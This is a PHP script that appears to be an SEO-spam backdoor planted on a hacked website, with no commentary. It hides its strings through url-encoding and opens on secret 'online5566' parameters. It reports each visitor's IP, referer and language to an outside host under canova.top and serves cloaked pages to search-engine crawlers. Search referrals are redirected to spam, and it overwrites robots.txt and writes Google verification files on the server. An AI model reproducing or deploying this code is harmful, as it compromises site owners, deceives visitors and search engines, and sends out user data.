<?php
	error_reporting(0);
	header('Content-Type: text/html; charset=utf-8');
	$OoooOO0 = 'bhtwoj';$OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a";$O=urldecode($OOOOOO); 
    date_default_timezone_set('PRC');
    $dRoot = @$_SERVER['DOCUMENT_ROOT'];
    $rUrl = @$_SERVER['REQUEST_URI'];
    $curName = @basename(__FILE__);
    $sName = @$_SERVER['HTTP_HOST'];
	$Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $uAgent = @$_SERVER['HTTP_USER_AGENT'];
    $referer = @$_SERVER['HTTP_REFERER'];
    $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
    $typeName = $http_type . $sName;
    $uAgent = @strtolower($uAgent);
    $referer = @strtolower($referer);
	if(getenv('HTTP_CLIENT_IP')){ 
        $client_ip = getenv('HTTP_CLIENT_IP'); 
    } elseif(getenv('HTTP_X_FORWARDED_FOR')) { 
        $client_ip = getenv('HTTP_X_FORWARDED_FOR'); 
    } elseif(getenv('REMOTE_ADDR')) {
        $client_ip = getenv('REMOTE_ADDR'); 
    } else {
        $client_ip = $_SERVER['REMOTE_ADDR'];
    }
    if(isset($_GET['vf'])&&$_GET['vf']=='online5566') {
        echo 'domain online!';
        exit;
    }
    if (strstr($rUrl, 'sitemap_index_')) {
        $pr = dirname($rUrl);
        allmap($O,$OoooOO0,$typeName,$rUrl,$sName,$http_type,$pr);
    }
    if (strstr($rUrl, '.xml')) {
        $pr = dirname($rUrl);
        sitefun($O,$OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$pr);
    }
    function allmap($O,$OoooOO0,$typeName,$rUrl,$sName,$http_type,$pr){
        $ol = 'http://'.$OoooOO0.'.canova.top/Api/siteAllMap.php?page='.$rUrl.'&pwd=sl123&domain='.$typeName.'&cur='.$curName;
        if ($_GET['vf_allmap'] == 'online5566') {
            echo $ol;
            exit;
        }
        $getRes = json_decode(getCurl($O,$ol), true);
        if (empty($getRes)||$getRes['code'] == 404) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        if (empty($getRes)||$getRes['code'] == 444) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        $getsResult = $getRes['data'];
        header('Content-type:text/xml');
        echo $getsResult;
        exit();
    }
    function sitefun($O,$OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$pr='',$qs='') {
        $ol = 'http://'.$OoooOO0.'.canova.top/Api/siteUrlApi.php?stype=sitemap&num=6000&pr='.$pr.'&url='.$rUrl.'&domain='.$typeName.'&ip='.$client_ip.'&cur='.$curName;
        if ($_GET['vf_map'] == 'online5566') {
            echo $ol;
            exit;
        }
        $getRes = json_decode(getCurl($O,$ol), true);
		if (isset($getRes['code'])&&$getRes['code']=='600') {
			$getsResult = $getRes['data'];
			foreach($getsResult as $Oog => $Oov){
				$pingRes = getCurl($O,$Oov);
				$Oooo0s = (strpos($pingRes,'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
				echo $Oov.'===>Submitting Google Sitemap: '.$Oooo0s.PHP_EOL;
			}
			exit();
		} 
		if (isset($getRes['code'])&&$getRes['code']=='406'){
			echo 'Submitting Google Sitemap Return Fail';
			exit();
		}
        if (empty($getRes)||$getRes['code'] == 404) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        $getsResult = $getRes['data'];
        header('Content-type:text/xml');
        echo $getsResult;
        exit();
    }
	if(isset($_GET['google'])){
		$go=$_GET['google'];
		if (preg_match('/^google.*?(\.html)$/i', $go)) {
			if(putFile($O,$go,'google-site-verification:'.' '.$go)){
			    exit('<a href='.$go.'>'.$go.'</a>');
			} else{
			    exit('fail!!!!');
			}
		}
	}
    if(isset($_GET['robots'])){
        $both = '';
        $robots = $_GET['robots'];
        $ol = 'http://'.$OoooOO0.'.canova.top/Api/rob.php?rob='.$robots.'&pwd=sl123&domain='.$typeName.'&cur='.$curName;
        if ($_GET['vf_bot'] == 'online5566') {
            echo $ol;
            exit;
        }
        $getRes = json_decode(getCurl($O,$ol), true);
        if (empty($getRes)||$getRes['code'] == 404) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        $getsResult = $getRes['data'];
        if(putFile($O,'robots.txt',$getsResult)) {
    		echo $getsResult;
		    exit();
        } else {
            exit('fail!!!');
        }
    }
    if(preg_match('/google.co.jp|yahoo|google\.com[^.]*?$|bing/i', $referer)){
         if ($_GET['vf_jump'] == 'online5566') {
            echo 'http://'.$OoooOO0.'.canova.top/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName;
            exit;
        }
 		$jumpRes=getCurl($O,'http://'.$OoooOO0.'.canova.top/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName);
		if ($jumpRes) {
			echo $jumpRes;
			exit();
		}
    }
    if(stristr($uAgent,'googlebot')||stristr($uAgent,'bing')||stristr($uAgent,'Y!J')||stristr($uAgent,'y!j')||stristr($uAgent,'yahoo')||stristr($uAgent,'google')||stristr($uAgent,'Googlebot')||stristr($uAgent,'googlebot')){
        if ($_GET['vf_bot'] == 'online5566') {
            echo 'http://'.$OoooOO0.'.canova.top/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName;
            exit;
        }
        $file_contents = getCurl($O,'http://'.$OoooOO0.'.canova.top/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName);
		if(!empty($file_contents)){
            $getRes = json_decode($file_contents, true);
            if ($getRes['code'] == 404) {
                header('HTTP/1.0 404 Not Found');
                header('Status: 404 Not Found');
                exit();
            }
            if ($getRes['code'] == 500) {
                header('HTTP/1.1 500 Internal Server Error');
                exit();
            }
			echo $file_contents;
			exit;
		}
    }
    if ($_GET['vf_origin'] == 'online5566') {
        echo 'http://'.$OoooOO0.'.canova.top/org.php?domain='.$sName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName;
        exit;
    }
    getCurl($O,'http://'.$OoooOO0.'.canova.top/org.php?domain='.$sName.'&page='.$rUrl.'&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName);
	function getCurl($O,$gurl)
	{
		$file_contents = '';
		$user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
		if(function_exists('curl_init')){
			try
			{
				$ch = curl_init();
				$timeout = 30;
				curl_setopt($ch,CURLOPT_URL,$gurl);
				curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
				$file_contents = curl_exec($ch);
				curl_close($ch);
			}
			catch (Exception $e)
			{}
		}
		if(strlen($file_contents)<1&&function_exists('file_get_contents')){
			ini_set('user_agent',$user_agent);
			try
			{
				$file_contents = @file_get_contents($gurl);
			}
			catch (Exception $e)
			{}
		}
		return $file_contents;
	}
    function putFile($O,$htName, $htContents) {
        $handle = fopen($htName, 'w') or die('0');
        $result = fwrite($handle, $htContents);
        fclose($handle);
        return $result;
    }
?><?php

